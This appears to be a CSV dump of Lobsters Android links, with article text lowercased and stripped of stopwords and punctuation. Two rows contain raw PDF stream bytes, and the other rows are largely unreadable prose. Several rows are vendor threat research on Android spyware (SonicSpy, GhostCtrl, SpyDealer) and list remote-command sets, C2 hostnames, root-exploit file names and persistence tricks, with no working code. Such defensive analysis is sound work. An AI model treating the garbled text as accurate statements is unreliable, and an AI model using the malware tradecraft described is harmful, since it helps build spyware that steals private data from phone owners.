231,Lobsters,android,Android,Stress-free SQLite with Anko,http://www.kotlindevelopment.com/anko-sqlite-database/,stressfree sqlite anko,anko sqlite issue sqlite enter anko sqlite anko sqlite basic apk size impact method count rxjava component bottom line anko sqlite wrapper first one second,post anko sqlite library promising simplify working sqlite android persistent storage recurring theme mobile development huge percentage apps rely database varies developer hardly ever choose default sqlite implementation rather switch something easier use even mean including robust library issue sqlite come sqlite android developer deal following ton ton ton boilerplate mapping cursor contentvalues string based sql command error prone compiletime verification closing database every time thread synchronized access managing change model issue get severe database evolves elaborate structure wonder people choose orms wrapper around sql nosql database instead convenience come price increased size method count often strict way structuring model class mention conscience one feel remorse pulling complex huge dependency store instance simple class two enter anko sqlite anko sqlite wrapper around builtin sqlite apis promise eliminate lot boilerplate code introducing convenience function saying goodbye cursor contentvalues builtin safety mechanism use block guaranteeing database closed executing code inside basic including library implementation orgjetbrainsanko ankosqlite ankoversion first step create database helper class need extend managedsqliteopenhelper substitute builtin sqliteopenhelper concurrencyaware take care closing database using recommended way based official documentation class databasehelper ctx context managedsqliteopenhelper ctx librarydatabase null companion object private var instance databasehelper null synchronized fun instance context context databasehelper instance null instance databasehelper contextapplicationcontext return instance override fun oncreate database sqlitedatabase createtable booktablename true bookcolumnid integer primarykey bookcolumntitle text bookcolumnauthor text override fun onupgrade database sqlitedatabase oldversion int newversion int droptable booktablename true accessing database depends use case good solution dependency injection adding extension context val contextdatabase databasehelper get databasehelperinstance applicationcontext simple model class look like data class book val id int val title string val author string companion object val bookcolumnid id val tablename book val columntitle title val columnauthor author database running accessed via use function databaseuse code database closed code block executes active use block also function inside extension sqldatabase method accessed well work anko extension function inserting row super easy databaseuse insert booktablename bookcolumnid bookcolumntitle bookcolumnauthor roberto bolano good practice adding operation respective model class extension function thus encapsulating daofunctionality bookselectall database query requires bit code select query follow builderlike fluent pattern first specifying table statement limit etc optional parser latter responsible converting column formerly cursor object object used constructor example classparser book work automatically overridden well want mapping column variable select book look like val book databaseuse select booktablename exec parselist classparser per statement following supported column distinct orderby groupby limit select look like statement select booktablename whereargs bookcolumnauthor author author author exec parselist classparser last least since database operation nt run ui thread every call wrapped rx apk size impact following table contains method count size impliactions common persistence library based method count library method count dex size method count dependency dex size dependency anko sqlite room greendao ormlite android couchbase lite realm without rxjava component anko library huge dependency size bit deceiving since includes kotlin runtime method count dex size kb anko common module method count dex size kb well already added dependency least former independent sqlite wrapper conclusion already code kotlin sqlite module nt big impact term method count size bottom line using anko sqlite wrapper far easier dealing pure sqlite much smaller size ormnosql libs require build model class certain way recommend using anko sqlite simple database structure would took couple line code create quick reliable database without including heavy dependency however mapper daos sql query get painful database structure get complex orms nosql solution preferred post third series anko first one covered common module second layout dsl
232,Lobsters,android,Android,PilBox - Building Android Apps in PicoLisp,https://www.mail-archive.com/picolisp@software-lab.de/msg07658.html,pilbox building android apps picolisp,,
233,Lobsters,android,Android,A new Replicant 6.0 release,https://blog.replicant.us/2017/09/a-new-replicant-6-0-release/,new replicant release,initial replicant release device supported replicant galaxy note galaxy nexus galaxy tab galaxy tab galaxy note improvement fix ussd samsungril usb wifi adapter reverse tethering wiki recovery changelog,month passed since initial replicant release time another one release double number supported device contains important fix improvement latest change lineageos included mostly security fix updating recommended device supported replicant release make replicant available lot device already supported replicant include galaxy note galaxy nexus galaxy tab galaxy tab model also two new tablet model yet supported replicant gsm wifionly version galaxy note hardware similar galaxy note thus quite straightforward add new device furthermore tablet known bad modem isolation supported device working front back camera make currently best supported tablet support goal release well work done achieve goal unfortunately yet ready hopefully ready next release come around improvement fix ussd use ussd message replicant ussd message code enter check available balance refill select certain data plan depending provider may code functionality available paul rewrite samsungril type message could used support added rewrite new implementation feature improved decoding notably special character usb wifi adapter initial replicant release already included repwifi app provides nice interface use usb wifi adapter libre firmware app developed fil bergamo added quite new feature graphical restyling next version shipped release possible connect hidden network manually set dns server autoconnect wifi network adapter plugged fil also submitted patch provides fix annoying issue wifi adapter reverse tethering far network connection established using wifi adapter reverse tethering properly reported apps example fdroid usable thanks fil patch issue fixed possible make device supported replicant including newly added one usable certain wifi adapter despite improvement made release advised connection issue instability still possible severity mostly depends device use level battery charge see wiki detail recovery another goal release make usage recovery le errorprone intuitive device touch key like galaxy galaxy key backlight enabled time make easier identify back key button generally bigger allow better navigation via touchscreen previously failing installation internal external storage eg due file system used sd card work new setup wizard based setup wizard lineageos added device started first time setup wizard help configuration see changelog complete list notable change detailed support status newly added device
234,Lobsters,android,Android,Hardening the Kernel in Android Oreo,https://android-developers.googleblog.com/2017/08/hardening-kernel-in-android-oreo.html,hardening kernel android oreo,android nougat hardened usercopy hardened usercopy introduced privileged access never pan emulation arm kernel address space layout randomization kaslr kaslr kaslr postinit readonly memory postinit readonly memory conclusion,posted sami tolvanen senior software engineer android security hardening android userspace increasingly made underlying linux kernel attractive target attacker result third android security bug found kernel last year android oreo significant effort gone hardening kernel reduce number impact security bug android nougat worked protect kernel isolating userspace process addition selinux ioctl filtering requiring seccompbpf support allows apps filter access available system call processing untrusted input android focus kernel selfprotection four securityhardening feature backported upstream linux android kernel supported device first ship release hardened usercopy usercopy function used kernel transfer data user space kernel space memory back since missing invalid bound checking caused android kernel vulnerability hardened usercopy add bound checking usercopy function help developer spot misuse fix bug code also obscure driver bug slip hardening function prevents exploitation bug feature introduced upstream kernel version backported android kernel int buggydriverfunction void user src sizet size potential sizet overflow buf kmalloc size n gpfkernel result buf smaller size heap overflow copyfromuser buf src size return efault never reached confighardenedusercopyy example security issue hardened usercopy prevents privileged access never pan emulation hardened usercopy function help find mitigate security issue help developer actually use currently kernel code including driver access user space memory directly lead various security issue mitigate cpu vendor introduced feature supervisor mode access prevention smap privileged access never pan arm feature prevent kernel accessing user space directly ensure developer go usercopy function unfortunately hardware feature yet widely available device android user today upstream linux introduced software emulation pan kernel version arm backported feature android kernel starting together hardened usercopy pan emulation helped find fix bug four kernel driver pixel device int buggydrivercopydata struct mydata src void user ptr failure keep track user space pointer struct mydata dst struct mydata ptr readwrite fromto arbitrary user space memory location dst field use copy fromto user instead never reached pan emulation smap example security issue pan emulation mitigates kernel address space layout randomization kaslr android included support address space layout randomization aslr year randomizing memory layout make code reuse attack probabilistic therefore difficult attacker exploit especially remotely android brings feature kernel linux supported kaslr since version kaslr available upstream since linux android make kaslr available android kernel newer kaslr help mitigate kernel vulnerability randomizing location kernel code loaded boot example add bit entropy depending memory configuration device make code reuse attack difficult postinit readonly memory final hardening feature extends existing memory protection kernel creating memory region marked readonly kernel initialized make possible developer improve protection data need writable initialization nt modified le writable memory reduces internal attack surface kernel making exploitation harder postinit readonly memory introduced upstream kernel version backported android kernel newer applied protection data structure core kernel feature extremely useful developer working kernel driver conclusion android oreo includes mitigation common source security bug kernel especially relevant kernel security bug android vendor driver tend get much le scrutiny update make easier driver developer discover common bug development stopping reach end user device
235,Lobsters,android,Android,Does disabling Wi-Fi prevent my Android phone from sending Wi-Fi frames?,https://hal.inria.fr/hal-01575519/document,disabling wifi prevent android phone sending wifi frame,,obj type catalog version page r openaction r fit name r outline r pagelabels r endobj obj creator title subject author producer keywords creationdate moddate trapped false ptexfullbanner pdftex version tex live kpathsea version endobj obj type page kid r r r r r r r r r r r r r r r r r r r r count endobj obj resource r type page parent r content r annots r r cropbox mediabox rotate endobj obj dests r endobj obj type outline first r last r count endobj obj nums r r r r endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r cropbox rotate endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r group r annots r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r group r cropbox rotate endobj obj type page content r resource r mediabox parent r group r annots r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r cropbox rotate endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj font r xobject r r procset pdf text imagec imageb imagei endobj obj length filter flatedecode stream x c ԓ q uz c r f u
236,Lobsters,android,Android,"Android 8.0 ""Oreo"" released",https://www.blog.google/products/android/android-oreo-superpowers-coming-device-near-you/,android oreo released,google play protect supersonic speed android instant apps,evildoer trying get bad software onto device android oreo secure google play protect built security status front center setting tighter app install control battery depleted still galaxy away charger android oreo help minimize unintentional overuse battery apps background limit keep battery going longersupersonic speedwhen go speed perhaps important superpower android oreo get started task quickly ever faster boot speed twice fast pixel fact powered autofill android oreo remembers thing like logins permission quickly get favorite apps plus support android instant apps mean teleport directly new apps installation needed
237,Lobsters,android,Android,"SonicSpy: Over a thousand spyware apps discovered, some in Google Play",https://blog.lookout.com/sonicspy-spyware-threat-technical-research,sonicspy thousand spyware apps discovered google play,learn kind functionality highly concerning enterprise especially sending employee overseas reported mid hulk messenger troy chat learn lookout protect enterprise individual threat like sonicspy,lookout researcher identified thousand spyware apps related threat actor likely based iraq belonging family sonicspy sample aggressively deployed since february several making way onto google play store google removed least one apps lookout alerted company discovered threat lookout security cloud analysis stack identified spyware capability flagging app research team manual review lookout customer protected threat sample sonicspy recently found play store called soniac marketed messaging app soniac provide functionality customized version communication app telegram also contains malicious capability provide attacker significant control target device includes ability silently record audio take photo camera make outbound call send text message attacker specified number retrieve information call log contact information wifi access point overall sonicspy family support different remote instruction including seen soniac instance upon first execution sonicspy remove launcher icon hide victim establish connection infrastructure attempt install custom version telegram stored resraw directory titled suapk learn kind functionality highly concerning enterprise especially sending employee overseas determining functionality testing sonicspy malicious functionality relatively straight forward process due client server communication implemented quickly confirmed via dns poisoning running netcat running netcat port dns record net locally poisoned allows u interact directly infected device via command possible retrieve basic device information followed call log wifi access point clipboard data record surrounding audio stopping audio recording retrieving audio encoded data potential attribution analysed sample found contain many similarity spynote another malware family first reported mid many indicator suggest actor behind development example family share code similarity regularly make use dynamic dns service run nonstandard port case spynote attacker used custombuilt desktop application inject malicious code specific apps victim could still interact legitimate functionality trojanized apps due steady stream sonicspy apps seems likely actor behind using similar automatedbuild process however desktop tooling recovered point time account behind soniac iraqwebservice also previously posted two sonicspy sample play store although sample longer live unclear whether removed direct result google taking action actor behind sonicspy removed order evade detection long possible cached play store page apps hulk messenger troy chat confirm live analysis found contained functionality sonicspy sample cached web content hulk messenger troy chat also live play store anyone accessing sensitive information mobile device concerned sonicspy actor behind family shown capable getting spyware official app store actively developed build process automated likely sonicspy surface future learn lookout protect enterprise individual threat like sonicspy
238,Lobsters,android,Android,Google’s native ad blocker for Chrome shows up in Android developer build,https://techcrunch.com/2017/07/31/googles-native-ad-blocker-for-chrome-shows-up-in-android-developer-build/,google native ad blocker chrome show android developer build,google native ad blocker chrome show android developer build google spotted carsten knobloch directly google play,google native ad blocker chrome show android developer build google reportedly debut builtin ad blocking feature chrome browser next year first concrete look addition web navigation software action chrome prerelease canary app android preview test feature coming later stable version feature allows user toggle builtin blocker site intrusive advertising toggle found chrome setting menu subsection called ad site setting menu item allows toggle feature block ad site tend show intrusive ad though set default least build new menu setting first spotted carsten knobloch confirmed techcrunch interested user also download recent chrome canary build directly google play find setting canary run concurrently stable release chrome android gallery id google said providing publisher partner guideline qualifies intrusive ad help avoid included advertising blocked new feature according wall street journal report june blocked content would determined crossindustry organization called coalition better ad google member list offensive include repeated popups chrome already includes native setting block socalled prestitial ad prevent content shown often tied countdown timer report also claimed google going make feature live sometime publisher time review advertising practice dedicated tool search company preparing new tool ask visitor disable thirdparty blocker pay adfree pas site appearance ad blocker site intrusive ad chrome canary android fit general description feature would look like seems google pressing forward plan earnest take long time canary feature make stable build timeline reported previously also still fit reached google comment new feature introduced canary update receive information
239,Lobsters,android,Android,Verifying Security Invariants in ExpressOS (2013),https://haohuim.appspot.com/static/pubs/expressos-asplos13-slides.pdf,verifying security invariant expressos,,obj length r filter flatedecode stream jܟ n f k nt f v h j ov p ѿv vv ڸ w n u j x c g ŧu hld l r ӽb cvߺ k qfqy yocnt e p ad sl f gr q wi endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r r r r r extgstate r r font r r xobject r endobj obj length r filter flatedecode type xobject subtype form formtype bbox resource r group transparency c r true k false stream xtt endstream endobj obj endobj obj procset pdf xobject r r endobj obj length r filter flatedecode type xobject subtype form formtype bbox resource r group transparency c r true k false stream n xc fk r pq ݑnu㑬 l g k z g ng xvsrm ieq lv ʒx e ƨ e l x wfrf 뫨 n qh u ơ endstream endobj obj endobj obj procset pdf imageb imagec imagei colorspace r extgstate r r r r r xobject r r r r r r r pattern r endobj obj length r filter flatedecode type xobject subtype form formtype bbox resource r group transparency c r true k false stream endstream endobj obj endobj obj procset pdf imageb imagec imagei xobject r endobj obj length r filter flatedecode type xobject subtype form formtype bbox resource r group transparency c r true k false stream xtt endstream endobj obj endobj obj procset pdf pattern r endobj obj length r filter flatedecode type xobject subtype form formtype bbox resource r group transparency c r true k false stream endstream endobj obj endobj obj procset pdf pattern r endobj obj length r filter flatedecode type xobject subtype form formtype bbox resource r group transparency c r true k false stream x ن
240,Lobsters,android,Android,I am the reason for Hungarian notation in Android,http://beust.com/weblog/2017/07/17/i-am-the-reason-for-hungarian-notation-in-android/,reason hungarian notation android,reddit discussion convention probably understand hungarian notation type information scope information semantic information making wrong code look wrong really think hungarian notation android r,reason hungarian notation android know private string mname said fault topic come regular basis recently reddit discussion reminded never really explained notation came also much misunderstood hungarian notation like take opportunity clarify thing two part notation came probably understand hungarian notation convention one early engineer working android within month project tasked come coding convention style guide android api android team user code still java developer team time addressing problem amount java code android still reasonably small top priority come identifying field come bit bias time written decent amount java window c code found using specific syntax field useful microsoft us effect common use leading underscore eg name c ever since started writing java code always bothered fact java away convention task write java style guide one goal android since day one create development platform java developer would feel extremely comfortable put bias aside took time reviewing sun google internal java coding style guide came android style guide pretty much two style guide proposed tiny change one difference remember clearly regarding brace style guide require use brace everything introduced exception continuing statement fit line idea behind exception accomodate prevalent logging idiom android logdebug logd tag logging without exception log statement would take lot vertical screen space something agreed desirable first version style guide guide contain requirement prefix field anything sent guide team surprise everybody pushed back hard precisely mandate syntax field everybody felt field needed differentiated accept style guide prescription went back drawing board researched various way make happen considered name also mname mentioned rejected underscore much detraction java standard came across exotic notation using iv prefix instance variable ultimately rejected matter came across prefix stuck sensible least verbose obvious solution keep remove underscore use camel case thereby mname born proposal accepted team made notation official probably understand hungarian notation whenever discussion come hungarian notation hn notice people seem think whenever add metadata identifier automatically hn ignoring core concept behind hn deliberate design simonyi put came notation first lot different kind metadata add identifier name belong different category category identified far might type information scope information semantic information let review turn type information probably widespread use identifier metadata naming identifier type inferred used everywhere code see name lpszname used mean long pointer string zero terminator notation seems extremely verbose reader hostile actually quickly becomes second nature window programmer parse added information actually useful debug many obscure bug happen bowel window system mostly due heavily dynamic nature lot api heavy reliance c c scope information used android using metadata indicate kind variable dealing field local function parameter quickly apparent field really important aspect variable decided need convention discriminate local variable function parameter note metadata nothing type variable semantic information actually least used metadata information yet arguably useful kind discrimination apply variable identical similar type identical similar scope different semantics convention used need differentiate variable similar type different purpose time sensible name get sometimes metadata way example designing gui let user enter name might several variation widget called name edit text called textname text view tvname button validate cancel okname cancelname example important make clear identifier relate operation editing name differentiating function metadata hopefully nuanced view hungarian notation strongly recommend read joel spolsky making wrong code look wrong article topic help drive point home really think hungarian notation first think need stop using umbrella name hungarian notation vague asked question usually ask person clarify three option listed talking time even sure need think use term identifier metadata describe general idea behind adding information simple identifier name overall think approach merit case per case basis think default definitely useful especially gui example described find kind occurrence regular basis using identifier metadata kind code lead code harder read author future reader maintain also accept argument today ide distinguish identifier color need argument flawed two reason code often read outside ide starting ironically screen shot reddit discussion whic highlighting read code browser window terminal diff tool git tool capacity kind highlighting would make parsing code easier light touch identifier metadata help lot ide highlighting still help make sense ambiguous case gui example described still case developer know code ide ever know adding identifier metadata sensible choice make listen people tell identifier metadata never used always used kind naming tool developer toolbox common sense make relatively easy determine right time add metadata identifier finally often see extreme reaction issue code convention general year writing code noticed take day working code following certain convention completely accept stop noticing altogether time tolerate code indented two space month later working project four space indentation felt opposite go naming convention get used anything long convention followed consistently across code base working entry posted july filed android follow response entry r comment ping currently closed
241,Lobsters,android,Android,"Android Backdoor GhostCtrl can Silently Record Your Audio, Video, and More",https://blog.trendmicro.com/trendlabs-security-intelligence/android-backdoor-ghostctrl-can-silently-record-your-audio-video-and-more/,android backdoor ghostctrl silently record audio video,informationstealing retadup worm headline translate mobile ransomware secure bringyourown device byod trend micro mobile security android google play trend micro mobile security enterprise appendix,updated august pm pdt clarify ghostctrl attack vector informationstealing retadup worm affected israeli hospital actually part attack turned bigger first least term impact accompanied even dangerous threat android malware take device detected trend micro androidosghostctrlops androidosghostctrlopsa named android backdoor ghostctrl stealthily control many infected device functionality ghostctrl hosted retadup c c infrastructure sample analyzed masqueraded legitimate popular app us name app mm whatsapp even pokemon go socially engineered phishing email also attack vector malicious url led wouldbe victim download apps three version ghostctrl first stole information controlled device functionality without obfuscation second added device feature hijack third iteration combine best earlier version based technique employed expect evolve ghostctrl literally ghost ghostctrl also actually variant least based commercially sold multiplatform omnirat made headline november tout remotely take control window linux mac system touch android device vice versa lifetime license omnirat package cost u predictably omnirat cracking tutorial abound various underground forum member even provide patchers actually red flag show malicious apk omnirat spinoff given rat service modified removed compilation figure snapshot ghostctrl version resourcesarsc file indicating omnirat variant highlighted ghostctrl hauntingly persistent app launched string resource file writes actually malicious android application package apk malicious apk dynamically clicked wrapper apk ask user install avoiding tricky even user cancel ask install page prompt message still pop immediately malicious apk icon installed wrapper apk launch service would let main malicious apk run background figure wrapper apk lead main apk main apk backdoor function usually named comandroidengine mislead user thinking legitimate system application malicious apk connect c c server retrieve command via socket endpoint communication machine new socket hef klife ddnsnet ghostctrl posse infected device bidding command c c server encrypted locally decrypted apk upon receipt interestingly also found backdoor connects domain rather directly connecting c c server ip address attempt obscure traffic also found several dynamic name server dns point led c c ip address hef klife ddns net f klife ddns net php noip biz ayalove noip biz notable command contains action code object data enables attacker specify target content making flexible malware cybercriminals command allows attacker manipulate device functionality without owner consent knowledge list action code device action code control wifi state action code monitor phone sensor data real time action code set phone uimode like night modecar mode action code control vibrate function including pattern vibrate action code download picture wallpaper action code list file information current directory upload c c server action code delete file indicated directory action code rename file indicated directory action code upload desired file c c server action code create indicated directory action code use text speech feature translate text voiceaudio action code send smsmms number specified attacker content also customized action code delete browser history action code delete sm action code download file action code call phone number indicated attacker action code open activity viewrelated apps uniform resource identifier uri also specified attacker open browser map dial view etc action code control system infrared transmitter action code run shell command specified attacker upload output result another unique c c command integertype command responsible stealing device data different kind cybercriminals collected uploaded including call log sm record contact phone number sim serial number location browser bookmark data ghostctrl steal extensive compared android infostealers besides aforementioned information type ghostctrl also pilfer information like android o version username wifi battery bluetooth audio state uimode sensor data camera browser search service process activity information wallpaper also intercept text message phone number specified attacker daunting capability surreptitiously record voice audio upload c c server certain time stolen content encrypted uploaded c c server figure code snapshot showing information deleted upload figure related function code stealing information transfer package c c command selfdefined account audiomanager clipboard command trigger malicious routine worth noting commonly seen android rat clearingresetting password account specified attacker getting phone play different sound effect specify content clipboard customize notification shortcut link including style content control bluetooth search connect another device set accessibility true terminate ongoing phone call ghostctrl version stack ghostctrl first version framework enables gain adminlevel privilege function code time second version feature hijacked also incrementally increased malware evolved second third iteration figure framework ghostctrl first version gaining adminlevel privilege figure comparison backdoor function first left second right version figure code snapshot ghostctrl second version applying device admin privilege ghostctrl second version also mobile ransomware lock device screen reset password also root infected device also hijack camera create scheduled task taking picture recording video surreptitiously upload c c server file figure code snapshot showing ghostctrl ransomwarelike capability figure code snapshot showing ghostctrl root infected device third version ghostctrl incorporates obfuscation technique hide malicious routine shown figure attack chain ghostctrl third version ghostctrl third version wrapper apk first drop packed apk latter unpacks main apk dalvik executable dex executable linkable format file elf dex elf file decrypt string application programming interface api call main malicious apk runtime longwinded attack chain help make detection challenging exacerbated fact wrapper apk hide packed apk well dex elf file asset directory mitigation ghostctrl combination informationstealing worm potent also telling attacker tried cover base made sure infect endpoint ubiquity mobile device among corporate everyday end user ghostctrl capability indeed deliver scare impact ghostctrl underscore importance defense depth multilayered security mechanism deployed risk data better managed best practice information security professional itsystem administrator adopt secure bringyourown device byod include keep device updated android patching fragmented organization may custom requirement configuration needed keep device updated enterprise need balance productivity security apply principle least user permission byod device prevent unauthorized access installation dubious apps implement app reputation system detect block malicious suspicious apps deploy firewall intrusion detection prevention system endpoint mobile device level preempt malware malicious network activity enforce strengthen mobile device management policy reduce potential security risk employ encryption network segmentation data segregation limit exposure damage data regularly back data case device loss theft malicious encryption trend micro solution end user enterprise also benefit multilayered mobile security solution trend mobile security also available google play trend mobile security enterprise provides device compliance application management data protection configuration provisioning well protects device attack leverage vulnerability preventing unauthorized access apps well detecting blocking malware fraudulent website list hash detected androidosghostctrlopsandroidosghostctrlopsa appendix
242,Lobsters,android,Android,How F-Droid is Bringing Apps to Cuba,https://blog.grobox.de/2017/how-f-droid-is-bringing-apps-to-cuba/,fdroid bringing apps cuba,open app store fdroid documentation app store server app curation tool droidt shop sancti spíritus paquete semanal zapya,government opened first public wifi hotspot country internet access become available ordinary cuban even though modern mobile phone already found way country mostly used offline phone connected internet however cuc per hour still affordable cuban whose average salary cuc per month mobile phone shop offering apps update surprising cuban use little expensive bandwidth available download apps use thing communicating relative want apps go one many mobile phone repair shop get installed nominal fee order distinguish tough competition shop take interesting approach open app store local offline wifi network attract customer existing technology allows everybody open app store called fdroid fullblown app store kit come tool documentation required open store app store server app install apps phone curation tool manage store ease droidt fdroid repository normally fdroid app download come thousand useful free software apps without advertising user tracking however require internet connection downloaded fdroid official server thankfully fdroid allows add repository work similar package repository might know gnulinux distribution everybody create repository even offline network long people connected wifi use repository install update apps wifi antenna outside shop exactly droidt shop visited sancti spíritus cuba run repository within local wifi network currently offer apps mostly game also useful apps free everybody within range wifi router worse store location competitor really help drive people shop build reputation within local community far store city offering free convenient service customer cuban child looking printout available apps apps downloaded store employee put repository available unlimited number customer without ever needing connect internet droidt team even going last mile also offering spanish app metadata summary app description make easier people find app looking moment work making use new screenshot feature introduced fdroid app recently customer browse screenshots deciding whether install app screenshot droidt app category another nice service offer app update securely delivered fdroid somebody already downloaded apps repository come range wifi fdroid check update offer install one available huge advantage country people normally never care update expense security come surprise slogan update even hang huge letter right desk shop repository way hosted server see directly banner slogan great see free technology fdroid community worked many year liberate android user put unexpected use talented individual country like cuba help make difference sake completeness however mentioned ordinary downloads fdroid way cuban use get apps weekly data package sent country harddrives bus paquete semanal contain mostly movie tv show also news apps proprietary app called zapya popular among young cuban allows wirelessly share apps file two phone although fdroid offer functionality yet widely known currently improved match simplicity zapya offer cuban moment cuban sharing apps zapya
243,Lobsters,android,Android,SpyDealer: Android Trojan Spying on More Than 40 Apps,https://researchcenter.paloaltonetworks.com/2017/07/unit42-spydealer-android-trojan-spying-40-apps/,spydealer android trojan spying apps,android accessibility service google play protect detailed technical analysis service launching configuration rooting persistence baidu easy root rootnik android trojan command control sm tcp server udptcp client smishing vulnerability private data collection command control accessibility service abuse surveillance record phone call surrounding audio record video take photo monitor geographic location functionality conclusion trap android spydealer acknowledgement appendix iocs appendix b ipdomain list server get update palo alto network,prevalence google android smartphones popularity featurerich apps people rely smartphones store handle kind personal business information attracts adversary want steal information recently palo alto network researcher discovered advanced android malware named spydealer exfiltrates private data apps steal sensitive message communication apps abusing android accessibility service feature spydealer us exploit commercial rooting app gain root privilege enables subsequent data theft spydealer many capability including exfiltrate private data popular apps including wechat facebook whatsapp skype line viber qq tango telegram sina weibo tencent weibo android native browser firefox browser oupeng brower qq mail netease mail taobao baidu net disk abuse android accessibility service feature steal sensitive message popular communication social apps wechat skype viber qq take advantage commercial rooting app baidu easy root gain root privilege maintain persistence compromised device harvest exhaustive list personal information including phone number imei imsi sm mm contact account phone call history location connected wifi information automatically answer incoming phone call specific number remote control device via udp tcp sm channel spy compromised user recording phone call surrounding audio video taking photo via front rear camera monitoring compromised device location taking screenshots multiple factor mitigate risk threat user far know spydealer distributed google play store know exactly device initially infected spydealer seen evidence suggest chinese user becoming infected compromised wireless network reported information threat google created protection google play protect spydealer completely effective android device running version rooting tool us support version represents approximately active android device worldwide device running later version android still steal significant amount information take action require higher privilege june captured sample spydealer analysis show spydealer currently active development three version malware currently wild starting content configuration file almost constant string code encrypted encoded accessibility service also introduced steal targeted apps message according dataset sample use app name googleservice googleupdate recent sample observed created may oldest sample date back october indicating malware family active year half also observed evidence infected user discussing malware october february shown figure figure real infection instance wild detailed technical analysis service launching configuration installed android device spydealer show application icon however register two broadcast receiver listen event related device booting network connection status whenever event broadcasted key service component aatservice start first launch retrieves configuration information local asset file named readmetxt first line file indicates ip address remote server second line configures action malware take mobile network third line specifies action allowed wifi network configuration setting also remotely updated various channel one example readmetxt given figure full list ip address remote server available appendix b partial listing configurable action depicted table figure content readmetxt table partial listing configurable action number action number action get call history send recorded audio file get sm message capture screenshot record audio list file given directory get gsm location get gps location get contact intercept incoming sm message get information network traffic installed apps intercept incoming sm message get device specific information get current running apps rooting persistence spydealer us two different rooting procedure gain root superuser privilege sample version reuse root exploit used commercial rooting app baidu easy root rooting application like one created user want gain lowlevel access phone possible without removing security protection first time android malware stolen root exploit existing commercial rooting tool previously saw rootnik android trojan abuse root assistant tool gain root access spydealer gain root privilege abusing baidu easy root detailed drop customized su file named sux asset app data directory check infected device already rooted root privilege available need escalate root privilege check existence file datadata packagename brootrawzip contains rooting exploit file malware download http comapkrawzip file integrity inspected comparing value downloaded file precalculated one http unzips downloaded file app data directory attempt gain root privilege systematically executing exploit one one installs busybox remount system partition readwrite running sequence shell command superuser permission downloaded file rawzip contains exploit baidu easy root version depicted figure table give full list exploit stolen spydealer example executable binary file observed rawzip original file baidu easy root actually gzip format interesting recover original file name fbmemroot figure file downloaded rawzip baidu easy root file name original file name fbmemroot cameraconfigexp putuseroptexp hwhisiexp boomsh omapdspexp mtkispexp mtkfdvtexp cameraroot putuserexp mvlgalcoreexp exynosabuse futexcheatexp mtkvdecexp devmmapexp commonrootshell amjpegdecexp spydealer also gain root privilege thought another method use baidu easy root detailed drop file including sux getroot logopng asset app data directory copy file sux logopng dropped step datadata packagename appbin generate shell script datadata packagename appbintoorsh content depicted figure execute png toorsh gain root privilege two file deleted end figure content toorsh reader note second rooting method target android version included however exploit used attack remains unknown u none logopng getroot exists app asset gaining root privilege spydealer take step maintain persistence compromised device first drop native executable file powermanager data directory figure executed powermanager creates backup app apk file whenever app uninstalled figure running powermanager copy apk file systemappupdateapk resulting trojan running system app figure reinstallation core spydealer service aatservice launched perform malicious behavior figure drop executes powermanager figure monitor data directory reinstall got uninstalled figure malware copy reinstalls systemapp uninstalled command control spydealer capable receiving command remote server via number different channel either actively initiating connection server passively receiving instruction server channel include via sm udp tcp connection section detail malware utilizes channel communicate remote server sm spydealer register broadcast receiver higher priority default messaging app listen command via incoming sm message command received sm first decoded parsing processing sm command contains command index argument split newline command index range command detailed table table sm command list command index description get geographical location via gsm cell information collect contact device send back via sm gather sm message created later given date inbox outbox draft box send back via sm exfiltrate call history later given date sm collected information contains call duration phone number date time set auto reply phone number malware automatically answer incoming phone call number set one get geographical location based gsm cell information spydealer take advantage interface baidu map service figure first collect gsm cell identity area code network operator post encoded data baidu map service retrieve geographical location tactic compromised device location exposed attacker even gps available figure utilize interface baidu map service get geographical location besides command listed spydealer also set remote server ip address following two condition length command index received sm table larger command index actually remote server ip address incoming sm message body start string followed remote server ip address spydealer receives command index reply received sm command however receives command index spydealer acknowledge command received sending back specially formatted sm response example received command automatically reply message format msg repcall phone number incoming sm message contain command aborted mean user aware message however type sm message also blocked malware set incoming number blocking list tcp server spydealer creates tcp server compromised device listening port wait incoming command command format description listed table table command via tcp channel command format description imei send back device imei mobileinfor send back device information including imei imsi phone number send back contact information including contact name phone number send back sm message inbox outbox draft box send back call history including phone call duration type date listdirt directory send back information file given directory information contains file path file size last modified time close socket connection response data formatted following pattern byte length data data however authentication mechanism implemented accepting incoming command mean anyone connect compromised device control long one know target device ip address udptcp client aside tcp server passively wait command spydealer also actively connect remote server configured ip address ask command udp tcp first launch remote server ip address retrieved local asset readmetxt use udp tcp protocol determined based another local asset named socket list contains around different ipdomains spydealer may use remote server full list ipdomains found appendix b command data received client encrypted server using tiny encryption algorithm tea client receives command malware decrypts data figure par process command udptcp client channel attacker fully control compromised device different command varying private data collection surveillance remote code execution figure tea algorithm used decrypt incoming command command start command followed newline character encoded argument table detail full list command available channel one interesting command named sendmsg previously android malware could fake incoming sm message exploit smishing vulnerability patched android achieve effect newer android version spydealer first insert sm message inbox post notification indicating sm message arrived knowledge first malware family fake incoming sm message way command format command argument description listn cmdid n maxcount n directory cmdid command index maxcount max number file collect directory target directory list maxcount file directory send back file name file size last modified time searchdirn filesuffix timerange sizerange filesuffix suffix split timerange start time end time split sizerange smallest largest file size split search file external storage send back information file match given suffix last modified time file size subloadfilen filepath n cmdid n offset n length filepath target file path cmdid command index offset starting point file read length total number byte sent send back limited content specified file starting given offset setsctmn time time number second set screen taken interval time screenshot taken every time second getsctm query screen taken interval time hash value set filter used search file value query set filter 